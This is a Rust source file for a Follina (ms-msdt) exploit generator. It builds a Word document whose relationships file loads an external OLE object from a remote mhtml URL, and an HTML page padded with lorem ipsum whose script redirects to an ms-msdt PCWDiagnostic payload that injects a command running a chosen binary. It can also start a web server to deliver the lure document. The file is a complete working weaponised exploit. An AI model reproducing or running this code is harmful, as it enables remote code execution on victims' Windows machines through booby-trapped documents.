pub mod local_ip;
pub mod parse_args;

use d::start;
use std::fs::{create_dir_all, write, File};
use std::io::prelude::*;
use std::io::{Seek, Write};
use std::iter::Iterator;
use std::net::TcpListener;
use std::net::{IpAddr, SocketAddr, SocketAddrV4, SocketAddrV6};
use std::path::Path;
use std::process::exit;
use walkdir::{DirEntry, WalkDir};
use zip::result::ZipError;
use zip::write::FileOptions;

fn main() {
    println!("****************************************************************");
    println!("*                                                              *");
    println!("*                           Follina                            *");
    println!("*                                                              *");
    println!("*                Good thing we disabeled macros                *");
    println!("*                                                              *");
    println!("****************************************************************");

    let params = [
        "--manual",
        "--server",
        "--port",
        "--webroot",
        "--docx",
        "--html",
        "--help",
        "-h",
    ];
    let args: Vec<_> = std::env::args().collect();
    let (vec_flag, _vec_args) = parse_args::parse_args(&args, &params);
    if parse_args::get_flag_value("h", &vec_flag) == Some("".to_string())
        || parse_args::get_flag_value("help", &vec_flag) == Some("".to_string())
    {
        parse_args::usage(&args[0]);
        exit(0);
    }
    let opt_docx = parse_args::get_flag_value("docx", &vec_flag);
    let docx_name = match opt_docx {
        Some(value) => value,
        None => "document.docx".to_string(),
    };
    let opt_html = parse_args::get_flag_value("html", &vec_flag);
    let html_name = match opt_html {
        Some(value) => value,
        None => "exploit.html".to_string(),
    };
    let opt_webroot = parse_args::get_flag_value("webroot", &vec_flag);
    let webroot_string = match opt_webroot {
        Some(value) => value,
        None => "./www".to_string(),
    };
    let webroot = &webroot_string[..];

    let mut start_httpd = true;

    let opt_binary = parse_args::get_flag_value("binary", &vec_flag);
    let binary_string = match opt_binary {
        Some(value) => value,
        None => "\\\\windows\\\\system32\\\\calc".to_string(),
    };
    let binary = &binary_string[..];

    let ip;

    if parse_args::get_flag_value("manual", &vec_flag) == None {
        let opt_iface = parse_args::get_flag_value("server", &vec_flag);
        let iface_string = match opt_iface {
            Some(value) => value,
            None => "lo".to_string(),
        };

        let iface = &iface_string[..];
        let opt_local_ip = local_ip::get_iface_addr(iface);
        if opt_local_ip.is_some() {
            ip = local_ip::get_iface_addr(iface).unwrap();
        } else {
            println!("Interface has no IP address.");
            exit(1)
        }
    } else {
        start_httpd = false;
        let opt_addr = parse_args::get_flag_value("manual", &vec_flag);
        let addr_string = match opt_addr {
            Some(value) => value,
            None => "127.0.0.1".to_string(),
        };

        ip = addr_string.parse::<IpAddr>().unwrap();
    }

    let opt_port = parse_args::get_flag_value("port", &vec_flag);
    let port_string = match opt_port {
        Some(value) => value,
        None => "8080".to_string(),
    };

    let portnum = port_string.parse::<u16>();
    let port = match portnum {
        Ok(value) => value,
        Err(_) => 8080,
    };

    println!(
        "Generating files 

Configuration:
        IP     = {}
        Port   = {}
        Binary = {}\n",
        ip, port, binary
    );

    let payload_url = format!("http://{}:{}/exploit.html", ip, port);

    let _ = create_dir_all(webroot);

    let _ = generate_html(html_name, binary, webroot);
    let _ = generate_docx(docx_name, payload_url, webroot);

    if start_httpd == true {
        let socket: SocketAddr;
        match ip {
            IpAddr::V4(ipv4) => {
                let socket_v4 = SocketAddrV4::new(ipv4, port);
                socket = SocketAddr::V4(socket_v4);
            }
            IpAddr::V6(ipv6) => {
                let socket_v6 = SocketAddrV6::new(ipv6, port, 0, 0);
                socket = SocketAddr::V6(socket_v6);
            }
        };

        println!("\nServer starting... Please, visit http://{0}:{1}/document.docx to download the document.", ip, port);
        let is_socket_free = test_socket(&socket);
        match is_socket_free {
            Ok(_) => {
                start(&socket, webroot);
            }
            Err(value) => {
                println!("{}", value);
                exit(1)
            }
        }
    } else {
        println!(
            "\nNo server started. Please copy {}/exploit.html to the webserver at {} on port {}",
            webroot, ip, port
        );
    }
}

fn generate_docx(docx_name: String, payload_url: String, webroot: &str) {
    let filename = format!("{}/{}", webroot, docx_name);
    let relsfile = "docx/word/_rels/document.xml.rels";

    let _ = write(relsfile, tpl(payload_url));
    let _ = create_docx(&filename);
}

fn test_socket(socket: &SocketAddr) -> Result<(), String> {
    let listener = TcpListener::bind(socket);
    let _listener = match listener {
        Ok(_) => {
            return Ok(());
        }
        Err(errmsg) => {
            let message = format!("Cannot bind to address {}: {}", socket, errmsg);
            return Err(message);
        }
    };
}

fn generate_html(html_name: String, binary: &str, webroot: &str) {
    let filename = format!("{}/{}", webroot, html_name);

    let _ = write(filename, html(binary));
    println!("Created {}/{}", webroot, html_name);
}

fn payload(binary: &str) -> String {
    format!("\"ms-msdt:/id PCWDiagnostic /skip force /param \\\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$({})/.exe\\\"\"", binary)
}

fn tpl(payload_url: String) -> String {
    format!("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>
<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId8\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer\" Target=\"footer1.xml\"/><Relationship Id=\"rId13\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme\" Target=\"theme/theme1.xml\"/><Relationship Id=\"rId3\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings\" Target=\"webSettings.xml\"/><Relationship Id=\"rId7\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/header\" Target=\"header2.xml\"/><Relationship Id=\"rId12\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable\" Target=\"fontTable.xml\"/><Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings\" Target=\"settings.xml\"/><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles\" Target=\"styles.xml\"/><Relationship Id=\"rId6\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/header\" Target=\"header1.xml\"/><Relationship Id=\"rId11\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer\" Target=\"footer3.xml\"/><Relationship Id=\"rId5\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/endnotes\" Target=\"endnotes.xml\"/><Relationship Id=\"rId10\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/header\" Target=\"header3.xml\"/><Relationship Id=\"rId4\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/footnotes\" Target=\"footnotes.xml\"/><Relationship Id=\"rId1337\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\" Target=\"mhtml:{0}!x-usc:{0}\" TargetMode=\"External\"/><Relationship Id=\"rId9\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer\" Target=\"footer2.xml\"/></Relationships>", payload_url)
}

fn html(binary: &str) -> String {
    format!("<!doctype html>
<html lang=\"en\">
<head>
<title>
Good thing we disabled macros
</title>
</head>
<body>
<p>
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque pellentesque egestas nulla in dignissim. Nam id mauris lorem. Nunc suscipit id magna id mollis. Pellentesque suscipit orci neque, at ornare sapien bibendum eu. Vestibulum malesuada nec sem quis finibus. Nam quis ligula et dui faucibus faucibus. In quis bibendum tortor.

Curabitur rutrum leo tortor, venenatis fermentum ex porttitor vitae. Proin eu imperdiet lorem, ac aliquet risus. Aenean eu sapien pharetra, imperdiet ipsum ut, semper diam. Nulla facilisi. Sed euismod tortor tortor, non eleifend nunc fermentum sit amet. Integer ligula ligula, congue at scelerisque sit amet, porttitor quis felis. Maecenas nec justo varius, semper turpis ut, gravida lorem. Proin arcu ligula, venenatis aliquam tristique ut, pretium quis velit.

Phasellus tristique orci enim, at accumsan velit interdum et. Aenean nec tristique ante, dignissim convallis ligula. Aenean quis felis dolor. In quis lectus massa. Pellentesque quis pretium massa. Vivamus facilisis ultricies massa ac commodo. Nam nec congue magna. Nullam laoreet justo ut vehicula lobortis.

Aliquam rutrum orci tortor, non porta odio feugiat eu. Vivamus nulla mauris, eleifend eu egestas scelerisque, vulputate id est. Proin rutrum nec metus convallis ornare. Ut ultricies ante et dictum imperdiet. Ut nisl magna, porttitor nec odio non, dapibus maximus nibh. Integer lorem felis, accumsan a dapibus hendrerit, maximus nec leo. Vestibulum porta, orci sed dignissim porta, sem justo porta odio, quis rutrum tortor arcu quis massa. Aenean eleifend nisi a quam faucibus, quis scelerisque lectus condimentum. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin non dui nec odio finibus molestie. Suspendisse id massa nunc. Sed ultricies et sapien vel fringilla.
</p>
<p>
Donec tincidunt ac justo et iaculis. Pellentesque lacinia, neque at consectetur porttitor, leo eros bibendum lorem, eu sollicitudin dolor urna pharetra augue. Pellentesque facilisis orci quis ante tempor, ac varius eros blandit. Nulla vulputate, purus eu consectetur ullamcorper, mauris nulla commodo dolor, in maximus purus mi eget purus. In mauris diam, imperdiet ac dignissim ut, mollis in purus. In congue volutpat tortor eu auctor. Nullam a eros lectus. Aenean porta semper quam ac lacinia. Curabitur interdum, nisl eu laoreet tempus, augue nisl volutpat odio, dictum aliquam massa orci sit amet magna.

Duis pulvinar vitae neque non placerat. Nullam at dui diam. In hac habitasse platea dictumst. Sed quis mattis libero. Nullam sit amet condimentum est. Nulla eget blandit elit. Nunc facilisis erat nec ligula ultrices, malesuada mollis ex porta. Phasellus iaculis lorem eu augue tincidunt, in ultrices massa suscipit. Donec gravida sapien ac dui interdum cursus. In finibus eu dolor sit amet porta. Sed ultrices nisl dui, at lacinia lectus porttitor ut.

Ut ac viverra risus. Suspendisse lacus nunc, porttitor facilisis mauris ut, ullamcorper gravida dolor. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus sollicitudin, arcu id sagittis facilisis, turpis dolor eleifend massa, in maximus sapien dui et tortor. Quisque varius enim sed enim venenatis tempor. Praesent quis volutpat lorem. Pellentesque ac venenatis lacus, vitae commodo odio. Sed in metus at libero viverra mollis sed vitae nibh. Sed at semper lectus.
</p>
<p>
Proin a interdum justo. Duis sed dui vitae ex molestie egestas et tincidunt neque. Fusce lectus tellus, pharetra id ex at, consectetur hendrerit nibh. Nulla sit amet commodo risus. Nulla sed dapibus ante, sit amet fringilla dui. Nunc lectus mauris, porttitor quis eleifend nec, suscipit sit amet massa. Vivamus in lectus erat. Nulla facilisi. Vivamus sed massa quis arcu egestas vehicula. Nulla massa lorem, tincidunt sed feugiat quis, faucibus a risus. Sed viverra turpis sit amet metus iaculis finibus.

Morbi convallis fringilla tortor, at consequat purus vulputate sit amet. Morbi a ultricies risus, id maximus purus. Fusce aliquet tortor id ante ornare, non auctor tortor luctus. Quisque laoreet, sem id porttitor eleifend, eros eros suscipit lectus, id facilisis lorem lorem nec nibh. Nullam venenatis ornare ornare. Donec varius ex ac faucibus condimentum. Aenean ultricies vitae mauris cursus ornare. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas aliquet felis vel nulla auctor, ac tempor mi mattis. Nam accumsan nisi vulputate, vestibulum nisl at, gravida erat. Nam diam metus, tempor id sapien eu, porta luctus felis. Aliquam luctus vitae tortor quis consectetur. In rutrum neque sit amet fermentum rutrum. Sed a velit at metus pretium tincidunt tristique eget nibh. In ultricies, est ut varius pulvinar, magna purus tristique arcu, et laoreet purus elit ac lectus. Ut venenatis tempus magna, non varius augue consectetur ut.

Etiam elit risus, ullamcorper cursus nisl at, ultrices aliquet turpis. Maecenas vitae odio non dolor venenatis varius eu ac sem. Phasellus id tortor tellus. Ut vehicula, justo ac porta facilisis, mi sapien efficitur ipsum, sit fusce.
</p>
<script>
    location.href = {};
</script>

</body>
</html>\n", payload(binary))
}

const METHOD: Option<zip::CompressionMethod> = Some(zip::CompressionMethod::Deflated);

fn create_docx(docx_name: &str) {
    let src_dir = "docx/";
    let method = METHOD;
    match doit(src_dir, docx_name, method.unwrap()) {
        Ok(_) => println!("Created {}", docx_name),
        Err(e) => println!("Error: {:?}", e),
    }
}

fn zip_dir<T>(
    it: &mut dyn Iterator<Item = DirEntry>,
    prefix: &str,
    writer: T,
    method: zip::CompressionMethod,
) -> zip::result::ZipResult<()>
where
    T: Write + Seek,
{
    let mut zip = zip::ZipWriter::new(writer);
    let options = FileOptions::default()
        .compression_method(method)
        .unix_permissions(0o755);

    let mut buffer = Vec::new();
    for entry in it {
        let path = entry.path();
        let name = path.strip_prefix(Path::new(prefix)).unwrap();

        // Write file or directory explicitly
        // Some unzip tools unzip files with directory paths correctly, some do not!
        if path.is_file() {
            #[allow(deprecated)]
            zip.start_file_from_path(name, options)?;
            let mut f = File::open(path)?;

            f.read_to_end(&mut buffer)?;
            zip.write_all(&*buffer)?;
            buffer.clear();
        } else if !name.as_os_str().is_empty() {
            // Only if not root! Avoids path spec / warning
            // and mapname conversion failed error on unzip
            #[allow(deprecated)]
            zip.add_directory_from_path(name, options)?;
        }
    }
    zip.finish()?;
    Result::Ok(())
}

fn doit(
    src_dir: &str,
    dst_file: &str,
    method: zip::CompressionMethod,
) -> zip::result::ZipResult<()> {
    if !Path::new(src_dir).is_dir() {
        return Err(ZipError::FileNotFound);
    }

    let path = Path::new(dst_file);
    let file = File::create(&path).unwrap();

    let walkdir = WalkDir::new(src_dir);
    let it = walkdir.into_iter();

    zip_dir(&mut it.filter_map(|e| e.ok()), src_dir, file, method)?;

    Ok(())
}
